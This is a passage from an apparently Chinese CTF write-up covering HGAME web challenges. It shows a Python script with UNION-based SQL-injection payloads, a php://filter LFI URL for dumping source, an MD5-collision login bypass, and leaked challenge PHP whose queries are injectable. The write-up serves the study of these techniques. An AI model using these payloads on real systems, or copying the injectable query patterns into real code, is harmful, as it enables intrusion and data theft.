    <span class=k>catch</span> <span class=o>(</span><span class=n>Exception</span> <span class=n>e</span><span class=o>)</span>
    <span class=o>{</span>
      <span class=n>e</span><span class=o>.</span><span class=na>printStackTrace</span><span class=o>();</span>
    <span class=o>}</span>
    <span class=k>return</span> <span class=s>&#34;ok&#34;</span><span class=o>;</span>
  <span class=o>}</span>
  
  <span class=nd>@RequestMapping</span><span class=o>(</span><span class=n>value</span><span class=o>={</span><span class=s>&#34;/flag&#34;</span><span class=o>},</span> <span class=n>method</span><span class=o>={</span><span class=n>org</span><span class=o>.</span><span class=na>springframework</span><span class=o>.</span><span class=na>web</span><span class=o>.</span><span class=na>bind</span><span class=o>.</span><span class=na>annotation</span><span class=o>.</span><span class=na>RequestMethod</span><span class=o>.</span><span class=na>GET</span><span class=o>})</span>
  <span class=kd>public</span> <span class=n>String</span> <span class=nf>Flag</span><span class=o>(</span><span class=n>ModelMap</span> <span class=n>model</span><span class=o>)</span>
  <span class=o>{</span>
    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;This is the last question.&#34;</span><span class=o>);</span>
    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;123852^x % 612799081 = 6181254136845 % 612799081&#34;</span><span class=o>);</span>
    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;The flag is hgame{x}.x is a decimal number.&#34;</span><span class=o>);</span>
    <span class=n>model</span><span class=o>.</span><span class=na>addAttribute</span><span class=o>(</span><span class=s>&#34;flag&#34;</span><span class=o>,</span> <span class=s>&#34;Flag is not here.&#34;</span><span class=o>);</span>
    <span class=k>return</span> <span class=s>&#34;flag&#34;</span><span class=o>;</span>
  <span class=o>}</span>
<span class=o>}</span>
</code></pre></div><p>可以看到有个<code>/flag</code>的路由，我们只需要计算<code>123852^x % 612799081 = 6181254136845 % 612799081</code>这个就可以了，爆破得到<code>15387368</code>就是答案</p>
<h2 id=week-3>Week 3</h2>
<h3 id=web-2>Web</h3>
<h4 id=神奇的-md5>神奇的 md5</h4>
<blockquote>
<p>flag 在根目录下(请善待学生机)
hint:md5 碰撞 你自己本地去生成 3 个 md5 值一样的 sha 值不一样的 用 curl 上传</p>
<p>http://118.25.89.91:8080/question/login.php</p>
</blockquote>
<p>访问不了 2333</p>
<p>看其他师傅的 wp ，首先是个源码审计</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=nx>session_start</span><span class=p>();</span>
<span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>


    <span class=k>if</span> <span class=p>(</span><span class=o>@</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=k>and</span> <span class=o>@</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span> <span class=k>and</span> <span class=o>@</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>])</span>
    <span class=p>{</span>
        <span class=nv>$username</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>];</span>
        <span class=nv>$password</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>];</span>
        <span class=nv>$code</span>     <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>];</span>

        <span class=k>if</span> <span class=p>((</span><span class=nv>$username</span> <span class=o>==</span> <span class=nv>$password</span> <span class=p>)</span> <span class=k>or</span> <span class=p>(</span><span class=nv>$username</span> <span class=o>==</span> <span class=nv>$code</span><span class=p>)</span>  <span class=k>or</span> <span class=p>(</span><span class=nv>$password</span> <span class=o>==</span> <span class=nv>$code</span><span class=p>))</span> <span class=p>{</span> 
            <span class=k>echo</span> <span class=s2>&#34;Your input can&#39;t be the same&#34;</span><span class=p>;</span>
        <span class=p>}</span> 
        <span class=k>else</span> <span class=k>if</span> <span class=p>((</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$username</span><span class=p>)</span> <span class=o>===</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$password</span><span class=p>))</span> <span class=k>and</span> <span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$password</span><span class=p>)</span> <span class=o>===</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$code</span><span class=p>))){</span>
            <span class=k>echo</span> <span class=s2>&#34;Good&#34;</span><span class=p>;</span> 
	    
            <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Location: admin.php&#39;</span><span class=p>);</span>  
            <span class=k>exit</span><span class=p>();</span>
        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
            <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt; Invalid password&lt;/pre&gt;&#34;</span><span class=p>;</span>
        <span class=p>}</span>
    <span class=p>}</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p>看来是 md5 强碰撞，这里给三个 md5 一样的图片</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ curl -s http://www.fishtrap.co.uk/black.jpg.coll <span class=p>|</span> md5
b69dd1fd1254868b6e0bb8ed9fe7ecad
$ curl -s http://www.fishtrap.co.uk/brown.jpg.coll <span class=p>|</span> md5
b69dd1fd1254868b6e0bb8ed9fe7ecad
$ curl -s http://www.fishtrap.co.uk/white.jpg.coll <span class=p>|</span> md5
b69dd1fd1254868b6e0bb8ed9fe7ecad
</code></pre></div><p>后面就是简单的命令执行了</p>
<h4 id=sqli-1>sqli-1</h4>
<blockquote>
<p>sql 注入 参数是 id</p>
<p>http://118.89.111.179:3000/</p>
</blockquote>
<p>没有任何过滤，就是处理验证码 code 有点麻烦</p>
<p>贴一下自己的脚本</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>hashlib</span>
<span class=kn>import</span> <span class=nn>requests</span>
<span class=kn>from</span> <span class=nn>urllib</span> <span class=kn>import</span> <span class=n>parse</span>
<span class=kn>import</span> <span class=nn>re</span>
 
<span class=k>def</span> <span class=nf>md5</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>

<span class=k>def</span> <span class=nf>cal</span><span class=p>(</span><span class=n>code</span><span class=p>):</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>9999999</span><span class=p>):</span>
        <span class=k>if</span> <span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>code</span><span class=p>):</span>
            <span class=k>return</span> <span class=n>i</span>


<span class=n>headers</span> <span class=o>=</span> <span class=p>{</span> <span class=s1>&#39;Cookie&#39;</span><span class=p>:</span> <span class=s1>&#39;PHPSESSID=5vsgpoc8m9j8c66d9vfmru0uqd; path=/&#39;</span> <span class=p>}</span>
<span class=c1># req = requests.session()</span>
<span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://118.89.111.179:3000/&#34;</span>
<span class=n>rep</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
<span class=n>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;=== .*&lt;br&gt;&#39;</span><span class=p>,</span><span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
<span class=n>code</span> <span class=o>=</span> <span class=n>match</span><span class=o>.</span><span class=n>group</span><span class=p>()</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;=== &#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
<span class=n>code</span> <span class=o>=</span> <span class=n>code</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
<span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;1 union select table_name from information_schema.tables where table_schema=</span><span class=se>\&#39;</span><span class=s1>hgame</span><span class=se>\&#39;</span><span class=s1>;#&#39;</span>
<span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;1 union Select column_name from information_schema.columns where table_name=</span><span class=se>\&#39;</span><span class=s1>f1l1l1l1g</span><span class=se>\&#39;</span><span class=s1>;#&#39;</span>
<span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;1 union Select f14444444g from f1l1l1l1g;#&#39;</span>
<span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://118.89.111.179:3000/?id=</span><span class=si>%s</span><span class=s2>&amp;code=</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>parse</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span><span class=n>cal</span><span class=p>(</span><span class=n>code</span><span class=p>))</span>
<span class=n>rep</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</code></pre></div><h4 id=sqli-2>sqli-2</h4>
<blockquote>
<p>sql 注入</p>
<p>http://118.89.111.179:3001/?id=1</p>
</blockquote>
<p>我做的时候&mldr;也是访问不了&mldr;</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain>could not connect to the database: Connection refused
I&#39;ll tell you if SQL can be executed. 
</code></pre></div><p>直接显示链接数据库失败，看其他师傅的 wp ，看样子是个盲注的题，然而&mldr;</p>
<h4 id=基础渗透>基础渗透</h4>
<blockquote>
<p>综合利用各种漏洞来 getshell,然后找到被藏起来的 flag。</p>
</blockquote>
<p>用<code>http://111.231.140.29:10080/index.php?action=php://filter/read=convert.base64-encode/resource=user</code>直接读源码</p>
<p>User.php:</p>
<pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;?php
require_once('functions.php');
if (!isset($_SESSION['login'])) {
    Header(&quot;Location: /login.php&quot;);
    exit();
} else {
    echo &quot;&lt;div id='user-info' class='am-container'&gt;&quot;;
    echo &quot;&lt;div class='am-form'&gt;&quot;;
    echo &quot;&lt;div class='am-form-group am-form-file' id='form-file'&gt;&quot;;
    $image = get_avatar($_SESSION['user_id']);
    if ($image != null) {
        echo &quot;&lt;img type='button' src=data:image/png;base64,&quot; . $image['content'] . &quot; class='am-circle' id='avatar'&gt;&quot;;
    } else {
        echo &quot;&lt;div class='am-circle avatar-tmp' id='avatar'&gt;&quot; . md5($_SESSION['user']) . &quot;&lt;/div&gt;&quot;;
    }

}

?&gt;

    &lt;input type=&quot;file&quot; id=&quot;upfile&quot; onchange=&quot;SelectImage()&quot;&gt;
    &lt;/div&gt;
    &lt;button id=&quot;upload&quot; class=&quot;am-btn am-btn-primary am-disabled&quot;&gt;保 存 头 像&lt;/button&gt;
    &lt;/div&gt;

&lt;?php
echo &quot;&lt;div class='user'&gt;&lt;strong&gt;用户名： &lt;/strong&gt; &quot; . $_SESSION['user'] . &quot;&lt;/div&gt;&quot;;
echo &quot;&lt;hr&gt;&quot;;
echo &quot;&lt;div class='am-form am-form-horizontal'&gt;&quot;;
echo &quot;&lt;strong&gt;原密码：&lt;/strong&gt; &lt;input id='oldpassword' type='password'&gt; &quot;;
echo &quot;&lt;br&gt;&quot;;
echo &quot;&lt;strong&gt;新密码：&lt;/strong&gt; &lt;input id='newpassword' type='password'&gt;&quot;;
echo &quot;&lt;br&gt;&quot;;
echo &quot;&lt;strong&gt;新密码确认：&lt;/strong&gt; &lt;input id='newpassword_again' type='password'&gt; &quot;;
echo &quot;&lt;br&gt;&quot;;
echo &quot;&lt;/div&gt;&quot;;
echo &quot;&lt;button onclick='NewPassword()' class='am-btn am-btn-danger'&gt;确 认 修 改&lt;/button&gt;&quot;;
echo &quot;&lt;/div&gt;&quot;;
echo &quot;&lt;/div&gt;&quot;;
echo &quot;&lt;/div&gt;&quot;;

echo &quot;&lt;script src='/js/user.js'&gt;&lt;/script&gt;&quot;;
?&gt;
</code></pre><p>Functions.php</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=c1>//ini_set(&#34;display_errors&#34;, &#34;on&#34;);
</span><span class=c1></span><span class=k>require_once</span><span class=p>(</span><span class=s1>&#39;config.php&#39;</span><span class=p>);</span>
<span class=nx>session_start</span><span class=p>();</span>

<span class=k>function</span> <span class=nf>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>)</span>
<span class=p>{</span>
    <span class=k>global</span> <span class=nv>$mysqli</span><span class=p>;</span>
    <span class=nv>$res</span> <span class=o>=</span> <span class=nv>$mysqli</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>);</span>
    <span class=k>return</span> <span class=nv>$res</span><span class=p>;</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>csrf_token</span><span class=p>()</span>
<span class=p>{</span>
    <span class=nv>$token</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
    <span class=nv>$chars</span> <span class=o>=</span> <span class=nx>str_split</span><span class=p>(</span><span class=s1>&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class=p>);</span>
    <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=mi>48</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
        <span class=nv>$token</span> <span class=o>=</span> <span class=nv>$token</span> <span class=o>.</span> <span class=nv>$chars</span><span class=p>[</span><span class=nx>random_int</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>61</span><span class=p>)];</span>
    <span class=p>}</span>
    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$token</span><span class=p>;</span>
    <span class=k>echo</span> <span class=s2>&#34;&lt;input type=&#39;hidden&#39; value=&#39;</span><span class=si>$token</span><span class=s2>&#39; id=&#39;token&#39;&gt;&#34;</span><span class=p>;</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>res_to_json</span><span class=p>(</span><span class=nv>$res</span><span class=p>,</span> <span class=nv>$type</span><span class=p>)</span>
<span class=p>{</span>
    <span class=nv>$json</span><span class=p>[</span><span class=s1>&#39;type&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$type</span><span class=p>;</span>
    <span class=nv>$json</span><span class=p>[</span><span class=s1>&#39;status&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;true&#34;</span><span class=p>;</span>
    <span class=nv>$json</span><span class=p>[</span><span class=s2>&#34;content&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$res</span> <span class=k>as</span> <span class=nv>$message</span><span class=p>)</span> <span class=p>{</span>

        <span class=nv>$array_tmp</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$message</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>];</span>
        <span class=nv>$array_tmp</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$message</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>];</span>
        <span class=nv>$array_tmp</span><span class=p>[</span><span class=s1>&#39;avatar&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>get_avatar</span><span class=p>(</span><span class=nv>$message</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>])</span> <span class=o>!=</span> <span class=k>null</span> <span class=o>?</span> <span class=nx>get_avatar</span><span class=p>(</span><span class=nv>$message</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>])[</span><span class=s1>&#39;content&#39;</span><span class=p>]</span> <span class=o>:</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$message</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]);</span>
        <span class=nv>$array_tmp</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$message</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>];</span>
        <span class=nv>$array_tmp</span><span class=p>[</span><span class=s1>&#39;message_id&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$message</span><span class=p>[</span><span class=s1>&#39;message_id&#39;</span><span class=p>];</span>
        <span class=nv>$array_tmp</span><span class=p>[</span><span class=s1>&#39;time&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$message</span><span class=p>[</span><span class=s1>&#39;date&#39;</span><span class=p>];</span>
        <span class=nx>array_push</span><span class=p>(</span><span class=nv>$json</span><span class=p>[</span><span class=s2>&#34;content&#34;</span><span class=p>],</span> <span class=nv>$array_tmp</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=nv>$json</span><span class=p>[</span><span class=s2>&#34;content&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$json</span><span class=p>[</span><span class=s2>&#34;content&#34;</span><span class=p>];</span>
    <span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$json</span><span class=p>);</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>judge</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span> <span class=nv>$password</span><span class=p>)</span>
<span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$username</span> <span class=o>==</span> <span class=k>null</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>echo</span> <span class=s2>&#34;username&#39;s length error!&#34;</span><span class=p>;</span>
        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
    <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$password</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>6</span> <span class=k>or</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$password</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>echo</span> <span class=s2>&#34;password&#39;s length error!&#34;</span><span class=p>;</span>
        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>register</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span> <span class=nv>$password</span><span class=p>,</span> <span class=nv>$token</span><span class=p>)</span>
<span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>judge</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span> <span class=nv>$password</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span> <span class=k>and</span> <span class=nv>$token</span> <span class=o>===</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>])</span> <span class=p>{</span>
        <span class=nv>$password</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$password</span><span class=p>);</span>
        <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;insert into `users`(`username`,`password`) VALUES (&#39;</span><span class=si>$username</span><span class=s2>&#39;,&#39;</span><span class=si>$password</span><span class=s2>&#39;)&#34;</span><span class=p>;</span>
        <span class=nv>$res</span> <span class=o>=</span> <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=nv>$res</span><span class=p>)</span> <span class=p>{</span>
            <span class=k>echo</span> <span class=s1>&#39;register success!&#39;</span><span class=p>;</span>
        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
            <span class=k>echo</span> <span class=s1>&#39;error!&#39;</span><span class=p>;</span>
        <span class=p>}</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=k>echo</span> <span class=s2>&#34;error!&#34;</span><span class=p>;</span>
        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
    <span class=p>}</span>

<span class=p>}</span>

<span class=k>function</span> <span class=nf>login</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span> <span class=nv>$password</span><span class=p>,</span> <span class=nv>$token</span><span class=p>)</span>
<span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;login&#39;</span><span class=p>])</span> <span class=k>and</span> <span class=nv>$token</span> <span class=o>===</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>])</span> <span class=p>{</span>
        <span class=nv>$password</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$password</span><span class=p>);</span>
        <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;select * from `users` where `username`=&#39;</span><span class=si>$username</span><span class=s2>&#39; and `password`=&#39;</span><span class=si>$password</span><span class=s2>&#39;&#34;</span><span class=p>;</span>
        <span class=nv>$res</span> <span class=o>=</span> <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=nv>$res</span><span class=o>-&gt;</span><span class=na>num_rows</span><span class=p>)</span> <span class=p>{</span>
            <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$res</span><span class=o>-&gt;</span><span class=na>fetch_array</span><span class=p>();</span>
            <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>];</span>
            <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>];</span>
            <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;groups&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;groups&#39;</span><span class=p>];</span>
            <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;login&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
            <span class=nx>setcookie</span><span class=p>(</span><span class=s1>&#39;user&#39;</span><span class=p>,</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]);</span>
            <span class=nx>setcookie</span><span class=p>(</span><span class=s1>&#39;groups&#39;</span><span class=p>,</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;groups&#39;</span><span class=p>]);</span>
        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
            <span class=k>echo</span> <span class=s2>&#34;error!&#34;</span><span class=p>;</span>
            <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
        <span class=p>}</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=k>echo</span> <span class=s2>&#34;error!&#34;</span><span class=p>;</span>
        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>loginout</span><span class=p>()</span>
<span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;loginout&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>])</span> <span class=p>{</span>
        <span class=nx>session_destroy</span><span class=p>();</span>
        <span class=nx>setcookie</span><span class=p>(</span><span class=s1>&#39;groups&#39;</span><span class=p>,</span> <span class=k>null</span><span class=p>);</span>
        <span class=nx>setcookie</span><span class=p>(</span><span class=s1>&#39;user&#39;</span><span class=p>,</span> <span class=k>null</span><span class=p>);</span>
        <span class=nx>Header</span><span class=p>(</span><span class=s2>&#34;Location: index.php&#34;</span><span class=p>);</span>
    <span class=p>}</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>get_avatar</span><span class=p>(</span><span class=nv>$user_id</span><span class=p>)</span>
<span class=p>{</span>
    <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;select `avatar` from `users` where `user_id`=</span><span class=si>$user_id</span><span class=s2>&#34;</span><span class=p>;</span>
    <span class=nv>$res</span> <span class=o>=</span> <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>fetch_row</span><span class=p>()[</span><span class=mi>0</span><span class=p>];</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$res</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>return</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;name&#39;</span> <span class=o>=&gt;</span> <span class=nv>$res</span><span class=p>,</span> <span class=s1>&#39;content&#39;</span> <span class=o>=&gt;</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;./img/avatar/&#39;</span> <span class=o>.</span> <span class=nv>$res</span> <span class=o>.</span> <span class=s1>&#39;.png&#39;</span><span class=p>)));</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=k>return</span> <span class=k>null</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>get_new_messages</span><span class=p>()</span>
<span class=p>{</span>
    <span class=nv>$start</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;start&#39;</span><span class=p>]</span> <span class=o>??</span> <span class=mi>0</span><span class=p>;</span>
    <span class=nv>$start</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$start</span><span class=p>);</span>
    <span class=nv>$user_id</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>];</span>
    <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;select * from `messages` where `user_id`=</span><span class=si>$user_id</span><span class=s2> LIMIT </span><span class=si>$start</span><span class=s2>,999999999999&#34;</span><span class=p>;</span>
    <span class=nv>$res</span> <span class=o>=</span> <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>);</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$res</span><span class=o>-&gt;</span><span class=na>num_rows</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>return</span> <span class=nx>res_to_json</span><span class=p>(</span><span class=nv>$res</span><span class=p>,</span> <span class=s2>&#34;messages&#34;</span><span class=p>);</span>
    <span class=p>}</span>

<span class=p>}</span>

<span class=k>function</span> <span class=nf>get_messages</span><span class=p>()</span>
<span class=p>{</span>
    <span class=nv>$start</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;start&#39;</span><span class=p>]</span> <span class=o>??</span> <span class=mi>0</span><span class=p>;</span>
    <span class=nv>$start</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$start</span><span class=p>);</span>
    <span class=nv>$user_id</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>];</span>
    <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;select * from `messages` where `user_id`=</span><span class=si>$user_id</span><span class=s2> ORDER BY `message_id` DESC LIMIT </span><span class=si>$start</span><span class=s2>,12&#34;</span><span class=p>;</span>
    <span class=nv>$res</span> <span class=o>=</span> <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>);</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$res</span><span class=o>-&gt;</span><span class=na>num_rows</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>return</span> <span class=nx>res_to_json</span><span class=p>(</span><span class=nv>$res</span><span class=p>,</span> <span class=s2>&#34;messages&#34;</span><span class=p>);</span>
    <span class=p>}</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>add_message</span><span class=p>(</span><span class=nv>$message</span><span class=p>)</span>
